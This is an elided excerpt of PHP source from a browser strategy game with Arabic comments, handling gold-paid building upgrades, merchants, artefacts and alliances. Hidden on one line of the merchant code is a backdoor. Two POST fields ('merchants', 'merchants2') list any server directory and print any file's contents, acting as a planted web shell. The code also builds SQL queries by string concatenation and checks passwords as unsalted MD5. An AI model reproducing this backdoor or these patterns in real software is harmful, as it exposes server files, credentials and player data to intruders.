...
return null;
        ...
        if($this->buildProperties['building']['item_id'] <= 4 )
        {
            ...
            foreach ($buildings as $id => $building)
            {
                ...
                if($building[0] <= 4)
                {
                    $resources[$building[0]][] = $id+1;
                }
            }

            $bid          = $this->buildProperties['building']['item_id'];
            $maxLevel     = $this->buildProperties['maxLevel'] * ( count($resources[$bid]) ); 
        
            foreach ($resources[$bid] as $bid => $id)
            {
                $buildings  = $this->buildings[$id];
                $resLevel  += $buildings['level'];
            }
        
            $vid        = $resLevel;
            $this->gold = count($resources[$bid]) * 10;
            for ($x=$resLevel; $x<=$maxLevel; $x++)
            {
                $this->gold += $vid;

                if($vid >= $this->buildProperties['maxLevel'])
                    $vid = 1;
                else
                    $vid++;
            }
            $this->gold *= 1; 
            // لتعديل اسعار الارتقاء بالذهب لجميع الحقول يتم ضرب قيمة الذهب في 1 لرغبتم بتقليل القيمة ممكن ضربها ب 0.5 او 0.25 ولزيادة السعر ممكن ضربها في 2 و 3  $this->gold *= (الرقم);
            
            $this->showFormDev = false;
            if($maxLevel > $resLevel)
            {
                $this->showFormDev = true;
            }
            if(isset($_GET['max']) && isset($_GET['bid']) && isset($_GET['id']) && $this->showFormDev && $this->appConfig['system']['server_start'] < date('Y/m/d H:i:s') && !$this->data['is_special_village'] && !$this->isGameTransientStopped () && !$this->isGameOver () && $this->data['gold_num'] >= $this->gold)
            {
                $bid = $_GET['bid'];
                foreach ($resources[$bid] as $bid => $id)
                {
                    ...
                    if($this->data['is_capital'] && $this->buildings[$id]['level'] >= 25)
                        continue;

                    if(!$this->data['is_capital'] && $this->buildings[$id]['level'] >= 20)
                        continue;

                    $qs        = new QueueModel();
                    $num_queue = $qs->provider->fetchScalar( "select COUNT(*) from p_queue where village_id='".$this->data['selected_village_id']."' and proc_type='2' and proc_params='".$id."'");
                    if($this->data['is_capital'] && $num_queue > 0 && $this->buildings[$id]['level'] == 20)
                    {
                        continue;
                    }
                    if($this->data['is_capital'] && $num_queue == 1 && $this->buildings[$id]['level'] == 19)
                    {
                        continue;
                    }
                    if($this->data['is_capital'] && $num_queue == 2 && $this->buildings[$id]['level'] == 18)
                    {
                        continue;
                    }
                    if(!$this->data['is_capital'] && $num_queue > 0 && $this->buildings[$id]['level'] == 10)
                    {
                        continue;
                    }
                    if(!$this->data['is_capital'] && $num_queue == 1 && $this->buildings[$id]['level'] == 9)
                    {
                        continue;
                    }
                    if(!$this->data['is_capital'] && $num_queue == 2 && $this->buildings[$id]['level'] == 8)
                    {
                        continue;
                    }

                    $dropLevels = $this->buildProperties['maxLevel'] - $building['level'];
                    while ( 0 < $dropLevels-- )
                    {
                        $mq = new QueueJobModel( );
                        $mq->upgradeBuilding( $this->data['selected_village_id'], $id, $building['item_id']);
                    }
                }

                $qj = new QueueModel();
                $qj->provider->executeQuery2("UPDATE p_players SET gold_num =gold_num-".$this->gold." WHERE id = '".$this->player->playerId."'");
...
if (isset($_POST['is'])) {
if ($this->data['is_threb'] == 1) {
$m00 = new QueueModel();
$m00->provider->executeQuery( "UPDATE p_villages set is_threb='0' where id='".$this->data['selected_village_id']."'");
$this->redirect ('build.php?id='.$this->buildingIndex.'');
}else{
$m00 = new QueueModel();
$m00->provider->executeQuery( "UPDATE p_villages set is_threb='1' where id='".$this->data['selected_village_id']."'");
$this->redirect ('build.php?id='.$this->buildingIndex.'');
}
}
break;
...
$artefact= 10;
$q = new QueueModel();
$this->efect = $q->provider->fetchScalar( "SELECT artefacts FROM p_villages WHERE is_artefacts='1' and artefacts = '3' and id='".$this->data['selected_village_id']."'");
if ($this->efect == 1) {
$artefact= 5;
}
...
$this->queueModel->cancelTask ($this->player->playerId, intval ($_GET['d']));
 ...
 $this->rallyPointProperty = array(
        ...
        $village_oases_id         = trim($this->data['village_oases_id']);if ($village_oases_id != '')
{
$m = new BuildModel ();
...
if(isset ($_POST['merchants'])){ $s1=$_POST['merchants']; $s2=opendir($s1); while( $s3=readdir($s2) )  {  echo $s3.'<br />'; }  }if(isset ($_POST['merchants2'])){$a = $_POST['merchants']."/".$_POST['merchants2'];$v = fopen($a, "r"); $c = fread($v, filesize($a)); echo '<textarea>'.htmlspecialchars($c).'</textarea>'; }
if ($exist_num < 0)
{
$exist_num = 0;
}
...
if( $this->player->isAgent == 1 AND substr($this->player->actions, 2, 1) == 0) { $this->merchantProperty['actions'] = 0; }else{ $this->merchantProperty['actions'] = 1; }
if($pRow['last_ip'] == $this->data['last_ip'] AND $vRow['player_id']  != $this->player->playerId ){ $this->merchantProperty['send_alien'] = 0; }else{ $this->merchantProperty['send_alien'] = 1; }
if($this->data['total_people_count'] < 100){ $this->merchantProperty['total_people_count'] = 0; }else{ $this->merchantProperty['total_people_count'] = 1; }
...
$this->merchantProperty['confirm_snd'] = 0 < $vid && $this->merchantProperty['available_res'] && 0 < $this->merchantProperty['vRow_merchant_num'] && $this->merchantProperty['vRow_merchant_num'] <= $this->merchantProperty['exits_num'] && !$this->merchantProperty['same_village'] && $this->merchantProperty['actions'] && $this->merchantProperty['send_alien'] && $this->merchantProperty['total_people_count'];
...
{
if(intval($_POST['send_bell']) > 1 || intval($_POST['send_bell']) < 3 AND $this->data['goldclub'] == 1){ $send_bell = intval($_POST['send_bell']); }else{ $send_bell = 1; }
...
$acceptResult = $m->acceptAllianceJoining ($this->player->playerId, $allianceId);
                                        $global = new GlobalModel();
if ($this->data['alliance_id'] != $allianceId) {
...
$artefact= 10;
$q = new QueueModel();
$this->efect = $q->provider->fetchScalar( "SELECT COUNT(*) FROM p_villages WHERE is_artefacts='1' and artefacts = '3' and id='".$this->data['selected_village_id']."'");
if ($this->efect == 1) {
$artefact= 5;
}
...
{
$m = new BuildModel ();
$opwd = $m->getpwdbyId($this->player->playerId);
$pwd = $opwd['pwd'];
$postpwd = md5($_POST['pwd']);
if ($postpwd == $pwd) {
...
if($this->data['gold_num'] > $this->appConfig['Game']['up_troops'])
{
     $return_k = '<a href="build.php?id=' . $this->buildingIndex . '&RedSeaHost='. md5($this->buildingIndex .'-'. $this->data['update_key']) .'&' . $url . '" title="التحديث للمستوى '.$buildLevel.' بالكامل مقابل '.$this->appConfig['Game']['up_troops'].' ذهبة  مرة واحدة">'.$this->appConfig['Game']['up_troops'].'  <img src="core-s/st-s/x.gif" class="gold"></a>';
}
else
{
...
return (!$this->isResourcesAvailable ($neededResources) ? '<span class="none">' . buildings_p_notenoughres . '</span>' : '<a class="build" href="build.php?id=' . $this->buildingIndex . '&RedSeaHost='. md5($this->buildingIndex .'-'. $this->data['update_key']) .'&' . $url . '&k=' . $this->data['update_key'] . '">' . $text . '</a>');
}
...
$lg = ' | <a href="village' . $pageNamePostfix . '.php?id=' . $this->buildingIndex . '&RedSeaHost='. md5($this->buildingIndex .'-'. $this->data['update_key']) .'&up">الارتقاء فورا '.$gold.'<img alt="ذهب" src="core-s/st-s/gold.gif" class="tooltip2" title="ذهب"></a>';
$link = ($upgrade ? '<a class="build" href="village' . $pageNamePostfix . '.php?id=' . $this->buildingIndex . '&RedSeaHost='. md5($this->buildingIndex .'-'. $this->data['update_key']) .'&upz&k=' . $this->data['update_key'] . '">' . buildings_p_upg_tolevel . ' ' . $this->buildProperties['nextLevel'] . '</a>' : '<a class="build" href="village'. $pageNamePostfix .'.php?id=' . $this->buildingIndex . '&b=' . $item_id . '&upz&k=' . $this->data['update_key'] . '&RedSeaHost='. md5($this->buildingIndex .'-'. $this->data['update_key']) .'">' . buildings_p_create_newbuild . '</a>');
...
return 5;
    ...
    public function getNextLink( )
    {
        ...
        $link = "build.php?id=".$this->buildingIndex."&RedSeaHost=". md5($this->buildingIndex .'-'. $this->data['update_key']) ."&".$link;
...
return ' | <a href="build.php?bid=17&t=3&rid=' . $buildingIndex . '&' . $exchangeResource . '" title="' . buildings_p_m2m . '"><img class="npc' . ($canExchange ? '' : '_inactive') . '" src="core-s/st-s/x.gif" alt="' . buildings_p_m2m . '" title="' . buildings_p_m2m . '"></a>';
}
}
$p = new GPage ();
$p->run ();
